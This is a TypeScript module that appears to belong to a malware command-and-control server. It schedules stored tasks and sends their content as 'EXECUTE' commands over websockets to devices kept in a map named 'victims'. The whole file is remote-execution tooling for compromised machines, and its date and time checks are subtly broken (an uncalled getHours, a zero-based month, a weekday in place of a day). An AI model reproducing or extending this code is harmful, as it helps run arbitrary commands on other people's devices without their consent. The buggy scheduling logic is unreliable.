import path from "path";
import Response from "./classes/Response";
import ScheduledTask from "./classes/ScheduledTask";
import Task from "./classes/Task";
import fs from 'fs';
import victims from "./victims";

var tasks: Response = {};
var scheduledTasks: Response = {}


export function initTasks(){
    console.log("Tasks System Activated");

    var taskLoc = path.join(__dirname, "tasks.json");
    if(!fs.existsSync(taskLoc)){
        fs.writeFileSync(taskLoc,"{}");
    }

    var taskContent = require("./tasks.json");
    for(let i in taskContent){
        let task: Task = taskContent[i] as Task;
        tasks[task.id] = task
    }

    var schedTaskLoc = path.join(__dirname, "scheduledTasks.json");
    if(!fs.existsSync(schedTaskLoc)){
        fs.writeFileSync(schedTaskLoc,"{}");
    }

    var scheduledTaskContent: Response = require(schedTaskLoc);
    for(let i in scheduledTaskContent){
        let scheduledTask: ScheduledTask = scheduledTaskContent[i] as ScheduledTask;
        scheduledTasks[scheduledTask.name] = scheduledTask;
    }

    setInterval(checkIfTasksShouldFire, 5);
}

export function saveTasks(){
    console.log("Saving Tasks");
    fs.writeFileSync(path.join(__dirname, "tasks.json"), JSON.stringify(tasks));
}

export function saveScheduledTasks(){
    fs.writeFileSync(path.join(__dirname, "scheduledTasks.json"), JSON.stringify(scheduledTasks));
}

export function unscheduleTask(name: string){
    delete scheduledTasks[name];
    saveScheduledTasks();
}

function executeScheduledTask(scheduledTask: ScheduledTask){
    var deviceID: string = scheduledTask.deviceID;
    if(victims.has(deviceID)){
        console.log(scheduledTask.id)
        var task: Task = tasks[scheduledTask.id] as Task;
        console.log(task)
        var content: string = task.content;
        //TODO: variables
        for(let variable in scheduledTask.variables){
            content = content.replaceAll(scheduledTask.variables[variable].name, scheduledTask.variables[variable].value);
        }

        victims.get(deviceID)?.ws.send(JSON.stringify({
            "messageType": "EXECUTE",
            "content": content
    }));

    console.log(`Sending task ${task.id} to ${deviceID}`);
    }
}

function checkIfTasksShouldFire(){
    var currentDate: Date = new Date();
    var dateString: string = `${currentDate.getFullYear()}-${currentDate.getMonth()}-${currentDate.getDay()}`
    var timeString: string = `${currentDate.getHours}:${currentDate.getMinutes()}`;

    for(const task in scheduledTasks){
        var scheduledTask: ScheduledTask = scheduledTasks[task] as ScheduledTask;
        if(scheduledTask.type === "Now"){
            executeScheduledTask(scheduledTask);
            unscheduleTask(scheduledTask.name);
        }
        if(scheduledTask.type === "Future"){
            var executeDate: string = scheduledTask.scheduleData["date"];
            var executeTime: string = scheduledTask.scheduleData["time"];

            if(dateString === executeDate && timeString === executeTime){
                executeScheduledTask(scheduledTask);
                unscheduleTask(scheduledTask.name);
            }
        }
    }
}

export {tasks, scheduledTasks};